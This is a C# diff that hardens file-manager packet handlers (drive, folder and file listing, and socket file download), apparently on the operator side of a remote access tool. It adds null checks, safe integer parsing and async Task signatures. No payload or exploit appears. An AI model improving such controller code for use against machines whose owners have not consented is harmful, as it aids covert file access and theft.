@@ -16,7 +16,7 @@ namespace Server.Handle_Packet
 {
     public class HandleFileManager
     {
-        public async void FileManager(Clients client, MsgPack unpack_msgpack)
+        public async Task FileManager(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
@@ -44,7 +44,13 @@ namespace Server.Handle_Packet
                             {
                                 FM.toolStripStatusLabel1.Text = "";
                                 FM.listView1.Items.Clear();
-                                string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
+                                
+                                // Null check for driver data
+                                string driverData = unpack_msgpack.ForcePathObject("Driver")?.AsString;
+                                if (string.IsNullOrEmpty(driverData))
+                                    break;
+                                
+                                string[] driver = driverData.Split(new[] { "-=>" }, StringSplitOptions.None);
                                 for (int i = 0; i < driver.Length; i++)
                                 {
                                     if (driver[i].Length > 0)
@@ -137,7 +143,7 @@ namespace Server.Handle_Packet
             }
             catch { }
         }
-        public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
+        public async Task SocketDownload(Clients client, MsgPack unpack_msgpack)
         {
             try
             {
@@ -154,7 +160,13 @@ namespace Server.Handle_Packet
                             {
                                 SD.Client = client;
                                 SD.labelfile.Text = Path.GetFileName(file);
-                                SD.FileSize = Convert.ToInt64(size);
+                                
+                                // Safe file size parsing
+                                if (long.TryParse(size, out long fileSize))
+                                    SD.FileSize = fileSize;
+                                else
+                                    SD.FileSize = 0;
+                                
                                 SD.timer1.Start();
                             }
                             break;
@@ -201,7 +213,11 @@ namespace Server.Handle_Packet
 
         private List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
         {
-            string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
+            string folderData = unpack_msgpack.ForcePathObject("Folder")?.AsString;
+            if (string.IsNullOrEmpty(folderData))
+                return new List<ListViewItem>();
+            
+            string[] _folder = folderData.Split(new[] { "-=>" }, StringSplitOptions.None);
             List<ListViewItem> lists = new List<ListViewItem>();
             int numFolders = 0;
             for (int i = 0; i < _folder.Length; i++)
@@ -223,7 +239,11 @@ namespace Server.Handle_Packet
 
         private List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1)
         {
-            string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
+            string fileData = unpack_msgpack.ForcePathObject("File")?.AsString;
+            if (string.IsNullOrEmpty(fileData))
+                return new List<ListViewItem>();
+            
+            string[] _files = fileData.Split(new[] { "-=>" }, StringSplitOptions.None);
             List<ListViewItem> lists = new List<ListViewItem>();
             for (int i = 0; i < _files.Length; i++)
             {
@@ -240,7 +260,13 @@ namespace Server.Handle_Packet
                     }));
                     lv.ImageKey = _files[i + 1];
                     lv.Group = listViewGroup;
-                    lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_files[i + 3])));
+                    
+                    // Safe file size parsing
+                    if (long.TryParse(_files[i + 3], out long fileSize))
+                        lv.SubItems.Add(Methods.BytesToString(fileSize));
+                    else
+                        lv.SubItems.Add("Unknown");
+                    
                     lists.Add(lv);
                 }
                 i += 3;
